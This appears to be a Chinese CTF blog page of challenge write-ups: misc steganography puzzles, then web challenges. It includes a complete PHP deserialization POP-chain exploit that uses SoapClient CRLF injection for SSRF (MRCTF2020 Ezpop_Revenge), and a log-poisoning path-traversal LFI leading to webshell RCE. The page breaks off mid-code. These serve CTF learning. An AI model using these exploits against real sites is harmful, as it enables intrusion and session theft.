<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>遇到图片——010editor打开试试，全局搜索flag、txt、zip等文件，如果有，就去分离，没有的话就考虑是否隐藏在LSB中，所以分离0通道导出为bin，然后尝试，也许是jpg，也许是txt，也许是zip，主要看文件头，像这题<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014160407.png" alt="img" style="zoom:67%;"><br>504b0304明显是zip的文件头，所以保存为zip</p>
<h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014160952.png" alt="img" style="zoom: 67%;">
下面应该是压缩包的密码，但是没看懂是干个啥
原来是盲文表。。。对照一下:

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kmdonowg</span><br></pre></td></tr></table></figure>

<p>得到了一个音频，听起来就是个莫斯电码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-.-. - …-. .-- .–. . … ----- —… --… …-- …— …–… …— …-- -… --…</span><br></pre></td></tr></table></figure>

<p>flag{wpei08732?23dz}</p>
<h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>爆破一下<br><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br>brainfuck加密，解密一下:</p>
<h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>要我们找webshell文件，这里可以使用linux系统的查找文件内容指令，或者使用D盾，这里试一下D盾，因为D盾后续还可用于awd查找shell文件<br> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014164727.png" alt="img" style="zoom:67%;"></p>
<h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>在流量包中可以看到一个很长的东西，感觉是有问题的base64解码一下，可以发现是一个JFIF文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014173329.png" alt="img" style="zoom:67%;"></p>
<p>此网站解码可以直接转成文件<br><a target="_blank" rel="noopener" href="https://the-x.cn/base64">https://the-x.cn/base64</a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014174450.jpg" alt="img" style="zoom:67%;">

<h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>RouterPassView查看后，搜索username或者password</p>
<h2 id="MISC-来首歌吧"><a href="#MISC-来首歌吧" class="headerlink" title="MISC 来首歌吧"></a>MISC 来首歌吧</h2><p>莫斯密码</p>
<h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>binwalk分离一下文件，可以得到一个压缩文件，zip伪加密，然后将0900改为0800</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014181310.png" alt="img"></p>
<p>然后再linux解压这个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x flag.vmdk -o.&#x2F;</span><br></pre></td></tr></table></figure>

<p>找到 key_part_one 里的 NUL文件 和 key_part_two 里的 where_is_flag_part_two.txt:flag_part_two_is_here.txt<br>注意:windows下解压不会有&lt;where_is_flag_part_two.txt:flag_part_two_is_here.txt这个文件 只有linux用命令解压才会有<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45485719/article/details/107417878">https://blog.csdn.net/weixin_45485719/article/details/107417878</a><br>就可以发现有如下文件:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014181800.png" alt="img" style="zoom:67%;"></p>
<p>这里是解密网址:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.splitbrain.org&#x2F;services&#x2F;ook</span><br></pre></td></tr></table></figure>

<p>flag{N7F5_AD5_i5_funny!}</p>
<h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p>010打开，发现flag.txt，然后去kali分离一下得到一个压缩包需要密码</p>
<p>然后又得到一张照片，，啥信息也没看到，原来是需要一个新的工具:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide</span><br><span class="line">将secret.txt文件隐藏到text.jpg中：</span><br><span class="line"># steghide embed -cf test.jpg -ef secret.txt -p 123456</span><br><span class="line"></span><br><span class="line">从text.jpg解出secret.txt:</span><br><span class="line">#steghide extract -sf test.jpg -p 123456</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「Blood_Seeker」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;Blood_Seeker&#x2F;article&#x2F;details&#x2F;81837571</span><br></pre></td></tr></table></figure>

<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>为了校赛做了一下misc，单纯学一下基本操作:<br>1.压缩文件:zip:考虑zip爆破，或者zip伪加密<br>   rar:使用rar爆破密码工具<br>2.图片——隐写：<br>010打开，直接搜索flag、txt、jpg等，看看有没有隐藏，分离一下<br>steg工具，lsb的0通道合成一下导出为bin 看一下文件头是个啥，保存为特定的文件就行了</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/10/MRCTF2020/">MRCTF2020</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-10</time><div class="content"><h2 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h2><p><a target="_blank" rel="noopener" href="http://www.zip源码泄露,下载下来审计一下,有一个flag.php,看起来是需要ssrf漏洞的因为需要你访问的来源是127.0.0.1/">www.zip源码泄露，下载下来审计一下，有一个flag.php，看起来是需要SSRF漏洞的因为需要你访问的来源是127.0.0.1</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>毕竟是框架题，看了一下，应该是要反序列化找ssrf的漏洞的位点然后去打，全局搜索一下反序列化函数，可以发现，我们传入的coincidence[‘hello’], $this-&gt;coincidence[‘world’]会被分为两个部分传入Typecho_Db</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;admin&#x27;</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">				unserialize(base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>传入之后，在这里进行进行了一个拼接,并在最后实例化了这个类,可以看到这里提示了一个tostring<br>方法，所以我们就去找找Typecho_Db，看看是否有这个tostring方法，可以进行操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$adapterName, $prefix = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">       $adapterName = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//实例化适配器对象</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以发现，这里有一个tostring方法可以进行操作，其实链子到这里就似乎已经断了，但是该如何实现ssrf呢？就要想到一个php的内置类soapclient，而这里有个点，_adapter-&gt;parseSelect，如果将adapter赋值为这个类，那么就会调用这个类中不存在的方法，相当于触发了其中的call函数，并且这里还有可控的参数供我们写入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> KEYWORDS = <span class="string">&#x27;*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;table&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;fields&#x27;</span> =&gt; <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;join&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">&#x27;where&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;offset&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;order&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;group&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;having&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;rows&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">private</span> $_prefix;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27; SET &#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>梳理一下pop链的逻辑<br>1.HelloWorld_Plugin为pop链反序列化的入口，跳转至HelloWorld_DB类中进行Typecho_Db进行一个初始化，并通过concidence传入数值<br>2.通过tostring跳转至Typecho_Db的tostring魔术方法中<br>3.针对adatpter的一个调用赋值为sopa类并进行sopa类的call方法的调用，最后利用这个call方法进行一个ssrf发送报文实现flag的获取</p>
<p>所以初步的一个pop链就是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence=<span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild=<span class="keyword">array</span>(<span class="string">&quot;action&quot;</span>=&gt;<span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter=<span class="keyword">new</span> SoapClient;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们要将flag带出来，还需要吧自己的phpsessid传过来，然而soap并不能设置cookie，因此需要crlf，soapclient可以这只ua，只要在ua后加上\r\nCookie：PHPSESSID=xxx,就可以为http头添加一个新的cookie字段，这样就可以带出session了，最后就是寻找一下其中的路由即可，<br>在/var/Typecho/Plugin.php 就有如下路由</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> */</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params">$pluginName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">self</span>::$_plugins[<span class="string">&#x27;activated&#x27;</span>][$pluginName] = <span class="built_in">self</span>::$_tmp;</span><br><span class="line">    <span class="built_in">self</span>::$_tmp = <span class="keyword">array</span>();</span><br><span class="line">    Helper::addRoute(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在后面看了题解，发现这题有一个坑，就是这里private属性不能单纯的使用%00绕过需要将其转为十六进制才行<br>所以最终的脚本如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence=<span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        $post_string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=abcd&#x27;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;eki\r\nContent-Type: application/x-www-form-urlencoded\r\n&quot;</span>.join(<span class="string">&quot;\r\n&quot;</span>,$headers).<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&quot;\r\n\r\n&quot;</span>.$post_string,</span><br><span class="line">            <span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild=<span class="keyword">array</span>(<span class="string">&quot;action&quot;</span>=&gt;<span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">&#x27;:&#x27;</span>, $str);</span><br><span class="line">    $newstr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/00/&#x27;</span>, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i - <span class="number">2</span>] = preg_replace(<span class="string">&#x27;/s/&#x27;</span>, <span class="string">&quot;S&quot;</span>, $arr[$i - <span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; $i &lt; count($arr) - <span class="number">1</span>; $i++) &#123;</span><br><span class="line">        $newstr .= $arr[$i];</span><br><span class="line">        $newstr .= <span class="string">&quot;:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .= $arr[$i];</span><br><span class="line">    <span class="keyword">return</span> $newstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> HelloWorld_DB();</span><br><span class="line">$a = preg_replace(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line">$urlen = urlencode($a);</span><br><span class="line">$urlen = preg_replace(<span class="string">&#x27;/%00/&#x27;</span>, <span class="string">&#x27;%5c%30%30&#x27;</span>, $urlen);</span><br><span class="line">$a = decorate(urldecode($urlen));</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure>

<p>但是很奇怪，用这个生成的payload打不通，于是我们来比对看看是哪里出了问题,测试了一下，原来问题出在http头的书写过程中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        $post_string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=abcd&#x27;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;eki\r\nContent-Type: application/x-www-form-urlencoded\r\n&quot;</span>.join(<span class="string">&quot;\r\n&quot;</span>,$headers).<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&quot;\r\n\r\n&quot;</span>.$post_string,</span><br><span class="line">            <span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = $a;</span><br></pre></td></tr></table></figure>

<h2 id="ALL-INFO-YOU-WANT"><a href="#ALL-INFO-YOU-WANT" class="headerlink" title="ALL_INFO_YOU_WANT"></a>ALL_INFO_YOU_WANT</h2><p>这种解法比较签到，是常规思路，这题的定位本来就是个白给的题目，所以就没改掉日志</p>
<p>由 http 回包 header 得知是 NGINX，直接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>

<p>但是因为 url 会被 url 编码，可以把一句话木马写在 User-Agent，另外记得一定要闭合不然 php 执行会出错，包含即可 RCE<br><strong>找flag新语句：通过文件内容找flag</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/10/jsp%E5%86%85%E5%AD%98%E5%90%97/">jsp内存马</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-10</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/09/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">电子取证</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-09</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/09/2021%E5%9B%BD%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/">2021国赛总决赛复现</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-09</time><div class="content"><h2 id="babypython-国赛总决赛复现"><a href="#babypython-国赛总决赛复现" class="headerlink" title="babypython[国赛总决赛复现]"></a>babypython[国赛总决赛复现]</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/09/V-N2020/">V&amp;N2020</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-09</time><div class="content"><h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>ctfd漏洞 cve-2020-7245</p>
<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p><strong><code>考点： 1.无回显rce 2.文件描述符</code></strong><br>分析源码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> 